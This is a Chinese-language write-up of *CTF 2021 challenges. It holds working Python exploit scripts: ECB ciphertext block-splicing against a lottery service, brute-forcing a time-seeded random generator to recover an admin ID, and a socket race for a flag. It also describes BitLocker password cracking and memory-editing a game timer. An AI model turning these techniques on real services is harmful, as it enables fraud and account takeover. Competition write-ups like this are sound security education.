I"X{<h1 id="web">WEB</h1>

<h2 id="oh-my-bet">oh-my-bet</h2>

<p>wp搜集中，之后补上</p>

<h2 id="lottery-again">lottery again</h2>

<p>ecb模式，按块加密，每块密钥相同，密文按块直接与明文对应，所以我们可以控制明密文对重放攻击。</p>

<p>对于一个enc，长106字节，如下</p>

<p>{“lottery”:”48e51545-cfd3-4d2e-8ea4-851c945b5faf”,”user”:”0123ff93-c230-49b9-b078-5d205247c5a8”,”coin”:81}</p>

<p>本题使用的是MCRYPT_RIJNDAEL_256加密，rijndael128与aes相同，都是以128位为一个块加密，rijndael256则是以256位为一个块，即32字节。</p>

<p>思路就是通过重放，将多个彩票不同块进行拼接，使得同一个user可以对应多个lottery。</p>

<p>因为每块是32字节对应切割位点如下：</p>

<table>
  <tbody>
    <tr>
      <td>{“lottery”:”48e51545-cfd3-4d2e-8</td>
      <td>ea4-851c945b5faf”,”user”:”0123ff</td>
      <td>93-c230-49b9-b078-5d205247c5a8”,</td>
      <td>“coin”:81}</td>
    </tr>
  </tbody>
</table>

<p>最后一块不足32字节自动填充。</p>

<p>可以看到我们无论替换哪一个块都不能完整控制lottery或者user，替换前两块的成功的前提是另一个enc的user前6字节也是0123ff，碰撞概率较小。</p>

<p>但是我们可以将第一个enc的前1，2块拼接上第二个enc的2，3，4块，形成如下类似的格式</p>

<p>{“lottery”:”48e51545-cfd3-4d2e-8ea4-851c945b5faf”,”user”:”0123ffb0e-b15c9de5afaa”,”user”:”8dfd276a-ee65-4563-af33-c1ae7c577322”,”coin”:88}</p>

<p>当json_decode之后后面的user会覆盖前面的，就成功控制user不变，lottery一直在变了。</p>

<p><strong>脚本如下</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
<span class="n">user_token</span> <span class="o">=</span> <span class="s">"1slT9Xb1TxoDtEtxKZ2k0n8c9T3lZttY"</span>
<span class="n">user_uuid</span> <span class="o">=</span> <span class="s">"fadf5f40-9fe1-4a57-8d5b-06f16584298b"</span>
<span class="n">user_enc</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"8mKK4YdL0VHw67+rtMCBv+z9SX4yB7SwYWlL2A3VPqXXFHIpf1XGIVDHNxW5td/3fyYbEEEBv43419eYjQAwd9thL1nc+6OWy2UDfXdG+INLgbXDkV8kaRNGurSbXtf5XUzAgdeXmksz508IscL5BqiGkpqPuH/4Qa5qAiM0/hU="</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s">"api_token"</span><span class="p">:</span> <span class="n">user_token</span>
<span class="p">}</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">"http://52.149.144.45:8080"</span>
<span class="k">def</span> <span class="nf">get_random</span><span class="p">():</span>
  <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
  <span class="n">username</span><span class="o">=</span><span class="n">get_random</span><span class="p">()</span>
  <span class="n">data</span><span class="o">=</span> <span class="p">{</span>
      <span class="s">"username"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
      <span class="s">"password"</span><span class="p">:</span> <span class="s">"asdasd"</span>
  <span class="p">}</span>
  <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/user/register"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
  <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

  <span class="k">return</span> <span class="n">username</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">"asdasd"</span><span class="p">):</span>
  <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"username"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
    <span class="s">"password"</span><span class="p">:</span> <span class="n">password</span>
  <span class="p">}</span>
  <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/user/login"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
  <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">d</span><span class="p">[</span><span class="s">'user'</span><span class="p">][</span><span class="s">'api_token'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">info</span><span class="p">(</span><span class="n">api_token</span><span class="p">):</span>
  <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/user/info?api_token="</span> <span class="o">+</span> <span class="n">api_token</span><span class="p">)</span>
  <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'uuid: '</span><span class="o">+</span><span class="n">d</span><span class="p">[</span><span class="s">'user'</span><span class="p">][</span><span class="s">'uuid'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">buy</span><span class="p">(</span><span class="n">api_key</span><span class="p">):</span>
  <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"api_token"</span><span class="p">:</span> <span class="n">api_key</span>
  <span class="p">}</span>
  <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/lottery/buy"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
  <span class="o">*</span><span class="c1">#print(res.text)*
</span>  <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">d</span><span class="p">[</span><span class="s">'enc'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">get_enc</span><span class="p">(</span><span class="n">enc</span><span class="p">):</span>
  <span class="n">o</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
  <span class="n">u</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">user_enc</span><span class="p">)</span>
  <span class="n">m</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">o</span><span class="p">[:</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="n">u</span><span class="p">[</span><span class="mi">32</span><span class="p">:])</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'enc: '</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="n">quote</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
  <span class="k">return</span> <span class="n">m</span>
<span class="k">def</span> <span class="nf">charge</span><span class="p">(</span><span class="n">enc</span><span class="p">):</span>
  <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"user"</span><span class="p">:</span> <span class="n">user_uuid</span><span class="p">,</span>
    <span class="s">"enc"</span><span class="p">:</span> <span class="n">enc</span><span class="p">,</span>
    <span class="s">"coin"</span><span class="p">:</span> <span class="s">"7"</span>
  <span class="p">}</span>
  <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">"/lottery/charge"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"charge: "</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">register</span><span class="p">()</span>
    <span class="n">api_token</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="n">enc</span> <span class="o">=</span> <span class="n">buy</span><span class="p">(</span><span class="n">api_token</span><span class="p">)</span>
    <span class="n">info</span><span class="p">(</span><span class="n">api_token</span><span class="p">)</span>
    <span class="n">mo_enc</span> <span class="o">=</span> <span class="n">get_enc</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
    <span class="n">charge</span><span class="p">(</span><span class="n">mo_enc</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="oh-my-note">oh-my-note</h2>

<p>用户不存在时会创建用户，并同时新建note</p>

<p><img src="..\images\starctf_xmaq-01.png" alt="" /></p>

<p>note id和user_id随机种子不同，但是note_id的种子使用了user_id</p>

<p>虽然对于时间戳我们只能知道分钟级别的，但是题目只精确到了四位，再算上60秒只需爆破60*10000次就能算出user_id，注时区不同所以在本地使用time.strptime得加8个小时。。。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="k">def</span> <span class="nf">get_random_id</span><span class="p">():</span>
    <span class="n">alphabet</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>
<span class="n">post_at</span> <span class="o">=</span> <span class="s">'2021-01-15 02:29 UTC'</span>
<span class="n">l</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">/</span><span class="mi">10000</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)]</span>
<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">60</span><span class="p">):</span>
    <span class="n">ta1</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">strptime</span><span class="p">(</span><span class="s">'2021-01-15 10:29:{} UTC'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s">'%Y-%m-%d %H:%M:%S UTC'</span><span class="p">)</span>
    <span class="n">ta</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">mktime</span><span class="p">(</span><span class="n">ta1</span><span class="p">))</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">ta</span> <span class="o">+</span> <span class="n">i</span>
        <span class="n">random</span><span class="p">.</span><span class="n">seed</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
        <span class="n">u_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
        <span class="n">random</span><span class="p">.</span><span class="n">seed</span><span class="p">(</span><span class="n">u_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
        <span class="n">p_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">p_id</span> <span class="o">==</span> <span class="s">'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u'</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">u_id</span><span class="p">)</span>
        
        <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">10000</span> <span class="o">%</span> <span class="mi">8999</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>
</code></pre></div></div>

<p>算出admin的user_id就能看到它发布的私有的flag</p>

<h2 id="oh-my-socket">oh-my-socket</h2>

<p>不知道是不是非预期，webserver有root权限任意命令执行，client有任意文件读，看了一下没啥用</p>

<p>给了源码</p>

<p><code class="language-plaintext highlighter-rouge">server\server\oh-some-funny-code</code>里是flag</p>

<p><code class="language-plaintext highlighter-rouge">server\server\server.py</code>大致功能为：</p>

<ul>
  <li>接受一个TCP连接，多了就<code class="language-plaintext highlighter-rouge">time.sleep(120)</code>然后close</li>
  <li>如果接收到<code class="language-plaintext highlighter-rouge">*ctf</code>就返回<code class="language-plaintext highlighter-rouge">oh-some-funny-code</code>的内容</li>
  <li>否则返回当前日期</li>
</ul>

<p>但是<code class="language-plaintext highlighter-rouge">client\client\client.py</code>也会持续连接server，所以要利用docker重启client和server的时间差去send<code class="language-plaintext highlighter-rouge">*ctf</code></p>

<p>本地尝试：</p>

<p><img src="..\images\starctf_xmaq-02.png" alt="" /></p>

<p><img src="..\images\starctf_xmaq-03.png" alt="" /></p>

<p>远程5个端口一直都有个<code class="language-plaintext highlighter-rouge">solve.py</code>或者其他脚本在循环上传连接server，做出来的选手在搅屎增大了每两分钟一次机会的利用难度</p>

<p>运气好手动试了几下就出了：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python*
</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">HOST</span> <span class="o">=</span> <span class="s">'172.21.0.2'</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">21587</span>
<span class="n">BUFSIZ</span> <span class="o">=</span> <span class="mi">1024</span>
<span class="n">ADDR</span> <span class="o">=</span> <span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
<span class="n">tcpCliSock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">tcpCliSock</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">ADDR</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
  <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'*ctf'</span>
  <span class="n">tcpCliSock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">tcpCliSock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">BUFSIZ</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
  <span class="n">tcpCliSock</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="..\images\starctf_xmaq-04.png" alt="" /></p>

<p>或者bp卡着点循环重放：</p>

<p><img src="..\images\starctf_xmaq-05.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> *ctf{ohhh_just_other_web_s111de_channel}
</code></pre></div></div>

<h1 id="misc">Misc</h1>

<h2 id="little-trick">little trick</h2>

<p>下载之后是一个bitlocker加密的硬盘镜像</p>

<p>利用 bitlocker password 对密码进行爆破，由于试用版只显示密码位数，不显示具体密码，所以在他的词典里面手动二分查找，最终获得密码12345678</p>

<p>用取证大师打开镜像，在回收站记录看到这个，恢复出来</p>

<p><img src="..\images\starctf_xmaq-07.png" alt="" /></p>

<p>RS7GUZ6.pdf</p>

<p>使 用苹果系列的任何一款设备打开都是下面这个效果</p>

<p><img src="..\images\starctf_xmaq-08.png" alt="" /></p>

<h2 id="minegame">MineGame</h2>

<p>可以使用CE使得程序的计时器停止，并且在CE暂停期间是可以对程序进行点击的，取消暂停之后可以看到点击结果，这样对于手速的要求就大大降低了，然后就可以好好玩扫雷了</p>

<p><img src="..\images\starctf_xmaq-09.png" alt="" /></p>

<h2 id="puzzle">puzzle</h2>

<p>gaps尝试了一下，发现拼不出来</p>

<p>google了一下原图，想到DDCTF的拼图技巧，把给的图片切片一下和原图进行对比</p>

<p><img src="..\images\starctf_xmaq-10.webp" alt="" /></p>

<p>上次DDCTF的脚本利用一下</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">cv2</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="n">np</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="o">*</span><span class="c1"># 读取目标图片*
</span><span class="n">source</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">imread</span><span class="p">(</span><span class="sa">r</span><span class="s">"C:\Users\LEOGG\Desktop\wallpaper.jpg"</span><span class="p">)</span>
<span class="o">*</span><span class="c1"># 拼接结果*
</span><span class="n">target</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="n">fromarray</span><span class="p">(</span><span class="n">np</span><span class="p">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">source</span><span class="p">.</span><span class="n">shape</span><span class="p">,</span> <span class="n">np</span><span class="p">.</span><span class="n">uint8</span><span class="p">))</span>
<span class="o">*</span><span class="c1"># 图库目录*
</span><span class="n">dirs_path</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"C:\Users\LEOGG\Desktop\test\test"</span>
<span class="o">*</span><span class="c1"># 差异图片存放目录*
</span><span class="n">dst_path</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"C:\Users\LEOGG\Desktop\dd\diff"</span>
<span class="k">def</span> <span class="nf">match</span><span class="p">(</span><span class="n">temp_file</span><span class="p">):</span>
  <span class="o">*</span><span class="c1"># 读取模板图片*
</span>  <span class="n">template</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">imread</span><span class="p">(</span><span class="n">temp_file</span><span class="p">)</span>
  <span class="o">*</span><span class="c1"># 获得模板图片的高宽尺寸*
</span>  <span class="n">theight</span><span class="p">,</span> <span class="n">twidth</span> <span class="o">=</span> <span class="n">template</span><span class="p">.</span><span class="n">shape</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span>
  <span class="o">*</span><span class="c1"># 执行模板匹配，采用的匹配方式cv2.TM_SQDIFF_NORMED*
</span>  <span class="n">result</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">matchTemplate</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">template</span><span class="p">,</span> <span class="n">cv2</span><span class="p">.</span><span class="n">TM_SQDIFF_NORMED</span><span class="p">)</span>
  <span class="o">*</span><span class="c1"># 归一化处理*
</span>  <span class="n">cv2</span><span class="p">.</span><span class="n">normalize</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">cv2</span><span class="p">.</span><span class="n">NORM_MINMAX</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
  <span class="o">*</span><span class="c1"># 寻找矩阵（一维数组当做向量，用Mat定义）中的最大值和最小值的匹配结果及其位置*
</span>  <span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">,</span> <span class="n">min_loc</span><span class="p">,</span> <span class="n">max_loc</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">minMaxLoc</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
  <span class="n">target</span><span class="p">.</span><span class="n">paste</span><span class="p">(</span><span class="n">Image</span><span class="p">.</span><span class="n">fromarray</span><span class="p">(</span><span class="n">template</span><span class="p">),</span> <span class="n">min_loc</span><span class="p">)</span>
  <span class="k">return</span> <span class="nb">abs</span><span class="p">(</span><span class="n">min_val</span><span class="p">)</span>
<span class="k">class</span> <span class="nc">MThread</span><span class="p">(</span><span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">):</span>
  <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">file_name</span><span class="p">):</span>
    <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">.</span><span class="n">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">file_name</span> <span class="o">=</span> <span class="n">file_name</span>
  <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="n">real_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">dirs_path</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
    <span class="n">rect</span> <span class="o">=</span> <span class="n">match</span><span class="p">(</span><span class="n">real_path</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">rect</span> <span class="o">&gt;</span> <span class="mf">6e-10</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="n">rect</span><span class="p">)</span>
      <span class="n">shutil</span><span class="p">.</span><span class="n">copy</span><span class="p">(</span><span class="n">real_path</span><span class="p">,</span> <span class="n">dst_path</span><span class="p">)</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">dirs</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">dirs_path</span><span class="p">)</span>
<span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">dirs</span><span class="p">:</span>
  <span class="k">if</span> <span class="n">k</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'jpg'</span><span class="p">):</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"processing on pic"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">count</span><span class="p">))</span>
    <span class="n">mt</span> <span class="o">=</span> <span class="n">MThread</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
    <span class="n">mt</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">mt</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">continue</span>
<span class="o">*</span><span class="c1"># 等待所有线程完成*
</span><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
  <span class="n">t</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
<span class="n">target</span><span class="p">.</span><span class="n">show</span><span class="p">()</span>
<span class="n">target</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="sa">r</span><span class="s">"C:\Users\LEOGG\Desktop\dd.jpg"</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="..\images\starctf_xmaq-11.webp" alt="" /></p>

<p>flag{you_can_never_finish_the}</p>

<h2 id="chess">chess</h2>

<p>4D象棋，wp搜到之后补上</p>

<p><strong>wp资料来自：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[星盟安全]: http://snowywar.top/wordpress/index.php/2021/01/18/ctf2020-writeup/
</code></pre></div></div>

:ET